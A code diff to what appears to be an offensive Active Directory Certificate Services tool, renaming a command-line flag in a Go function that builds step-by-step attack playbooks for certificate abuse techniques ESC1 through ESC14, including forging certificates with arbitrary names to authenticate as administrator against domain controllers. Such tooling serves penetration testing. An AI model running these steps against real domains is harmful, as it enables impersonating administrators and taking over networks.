@@ -97,7 +97,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			fmt.Sprintf("Identify template: %s (enrollee supplies subject + auth EKU)", tmpl.Name),
 			"Request certificate with arbitrary SAN (e.g., administrator@" + cfg.Domain + ")",
 			"Use forged certificate for Kerberos PKINIT or Schannel authentication",
-			fmt.Sprintf("Command: certstrike pki --exploit esc1 --template %s --upn administrator@%s --target-dc %s --domain %s",
+			fmt.Sprintf("Command: certstrike pki --esc 1 --template %s --upn administrator@%s --target-dc %s --domain %s",
 				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC2":
@@ -105,7 +105,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			fmt.Sprintf("Identify template: %s (Any Purpose EKU + enrollee supplies subject)", tmpl.Name),
 			"Request certificate with Any Purpose EKU — can be used as client auth",
 			"Authenticate as any user specified in the SAN",
-			fmt.Sprintf("Command: certstrike pki --exploit esc2 --template %s --upn administrator@%s --target-dc %s --domain %s",
+			fmt.Sprintf("Command: certstrike pki --esc 2 --template %s --upn administrator@%s --target-dc %s --domain %s",
 				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC3":
@@ -113,7 +113,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			fmt.Sprintf("Identify template: %s (Certificate Request Agent EKU)", tmpl.Name),
 			"Stage 1: Enroll for enrollment agent certificate",
 			"Stage 2: Use agent certificate to enroll on behalf of target user",
-			fmt.Sprintf("Command: certstrike pki --exploit esc3 --template %s --upn administrator@%s --target-dc %s --domain %s",
+			fmt.Sprintf("Command: certstrike pki --esc 3 --template %s --upn administrator@%s --target-dc %s --domain %s",
 				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC13":
@@ -121,7 +121,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			fmt.Sprintf("Identify template: %s (issuance policy OID linked to security group)", tmpl.Name),
 			"Enroll in the template — the issued certificate contains the linked issuance policy OID",
 			"Authenticate via Kerberos PKINIT — the OID maps to group membership in the TGT",
-			fmt.Sprintf("Command: certstrike pki --exploit esc13 --template %s --upn %s@%s --target-dc %s --domain %s",
+			fmt.Sprintf("Command: certstrike pki --esc 13 --template %s --upn %s@%s --target-dc %s --domain %s",
 				tmpl.Name, cfg.Username, cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC9":
@@ -131,7 +131,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Request certificate from vulnerable template — cert lacks requester SID extension",
 			"Restore attacker's original UPN",
 			"Authenticate with issued certificate — DC maps cert to target UPN (no SID check)",
-			fmt.Sprintf("Command: certstrike pki --exploit esc9 --template %s --upn administrator@%s --attacker-dn CN=%s,... --target-dc %s --domain %s",
+			fmt.Sprintf("Command: certstrike pki --esc 9 --template %s --upn administrator@%s --attacker-dn CN=%s,... --target-dc %s --domain %s",
 				tmpl.Name, cfg.Domain, cfg.Username, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC4", "ESC4-CHECK":
@@ -140,7 +140,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Modify template msPKI-Certificate-Name-Flag to enable ENROLLEE_SUPPLIES_SUBJECT",
 			"Exploit modified template as ESC1",
 			"Restore original template configuration",
-			fmt.Sprintf("Command: certstrike pki --exploit esc4 --template %s --upn administrator@%s --target-dc %s --domain %s",
+			fmt.Sprintf("Command: certstrike pki --esc 4 --template %s --upn administrator@%s --target-dc %s --domain %s",
 				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC6":
@@ -149,7 +149,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Request certificate from any template with arbitrary SAN in request attributes",
 			"CA processes the SAN attribute regardless of template configuration",
 			"Authenticate with forged certificate as target user",
-			fmt.Sprintf("Command: certstrike pki --exploit esc6 --template %s --upn administrator@%s --target-dc %s --domain %s",
+			fmt.Sprintf("Command: certstrike pki --esc 6 --template %s --upn administrator@%s --target-dc %s --domain %s",
 				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC7":
@@ -158,7 +158,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA",
 			"Exploit as ESC6 — request cert with arbitrary SAN",
 			"Restore original CA configuration",
-			fmt.Sprintf("Command: certstrike pki --exploit esc7 --ca <CA_NAME> --upn administrator@%s --target-dc %s --domain %s",
+			fmt.Sprintf("Command: certstrike pki --esc 7 --ca <CA_NAME> --upn administrator@%s --target-dc %s --domain %s",
 				cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC8":
@@ -176,7 +176,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Confirm StrongCertificateBindingEnforcement < 2",
 			"Obtain a certificate with authentication EKU from the template",
 			"Authenticate using the certificate — DC maps via weak UPN/S4U2Self method",
-			fmt.Sprintf("Command: certstrike pki --exploit esc9 --template %s --upn administrator@%s --attacker-dn CN=%s,... --target-dc %s --domain %s",
+			fmt.Sprintf("Command: certstrike pki --esc 9 --template %s --upn administrator@%s --attacker-dn CN=%s,... --target-dc %s --domain %s",
 				tmpl.Name, cfg.Domain, cfg.Username, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC11":
@@ -193,7 +193,7 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Confirm CA private key is stored on a network HSM or DCOM enrollment is unrestricted",
 			"Connect to ICertRequest DCOM interface on the CA server",
 			"Request certificate via DCOM — bypasses web enrollment and RPC restrictions",
-			fmt.Sprintf("Command: certstrike pki --exploit esc12 --template %s --upn administrator@%s --target-dc %s --domain %s",
+			fmt.Sprintf("Command: certstrike pki --esc 12 --template %s --upn administrator@%s --target-dc %s --domain %s",
 				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
 		}
 	case "ESC14":
